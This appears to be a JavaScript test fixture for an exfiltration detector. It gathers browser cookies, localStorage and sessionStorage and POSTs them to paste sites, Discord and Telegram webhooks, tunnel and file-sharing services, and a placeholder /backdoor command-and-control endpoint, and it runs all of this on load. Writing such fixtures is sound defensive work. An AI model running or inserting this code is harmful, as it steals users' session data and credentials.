// Advanced Network Exfiltration Test
// This file contains comprehensive network exfiltration patterns

// 1. Multiple suspicious domains
const exfiltrateData = (data) => {
    // Pastebin family domains
    fetch('https://pastebin.com/api/api_post.php', {
        method: 'POST',
        body: data
    });
    
    fetch('https://hastebin.com/documents', {
        method: 'POST', 
        body: data
    });
    
    fetch('https://ix.io/', {
        method: 'POST',
        body: data
    });
    
    // Discord webhook exfiltration
    fetch('https://discord.com/api/webhooks/123456/abcdef', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({content: data})
    });
    
    // Telegram exfiltration
    fetch('https://api.telegram.org/bot123:ABC/sendMessage', {
        method: 'POST',
        body: `chat_id=123&text=${data}`
    });
    
    // Tunnel services
    fetch('https://abc123.ngrok.io/data', {
        method: 'POST',
        body: data
    });
    
    fetch('https://test.localtunnel.me/exfil', {
        method: 'POST', 
        body: data
    });
};

// 2. Hardcoded private IPs with C2 patterns
const c2Communication = () => {
    const privateIPs = [
        '10.0.1.100:8080',
        '192.168.2.50:9999', 
        '172.20.0.10:4444'
    ];
    
    privateIPs.forEach(ip => {
        fetch(`http://${ip}/backdoor`, {
            method: 'POST',
            body: JSON.stringify({
                type: 'heartbeat',
                hostname: window.location.hostname,
                data: localStorage.getItem('secrets')
            })
        });
    });
};

// 3. File sharing services
const shareSecrets = (secrets) => {
    fetch('https://transfer.sh/', {
        method: 'PUT',
        body: secrets
    });
    
    fetch('https://file.io/', {
        method: 'POST',
        body: new FormData().append('file', new Blob([secrets]))
    });
    
    fetch('https://0x0.st/', {
        method: 'POST', 
        body: secrets
    });
};

// 4. Webhook services
const webhookExfil = (data) => {
    fetch('https://requestbin.com/abc123', {
        method: 'POST',
        body: data
    });
    
    fetch('https://webhook.site/unique-id-here', {
        method: 'POST',
        body: data
    });
    
    fetch('https://beeceptor.com/test-endpoint', {
        method: 'POST',
        body: data
    });
};

// Execute exfiltration
const sensitiveData = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent
};

exfiltrateData(JSON.stringify(sensitiveData));
c2Communication();
shareSecrets(JSON.stringify(sensitiveData));
webhookExfil(JSON.stringify(sensitiveData));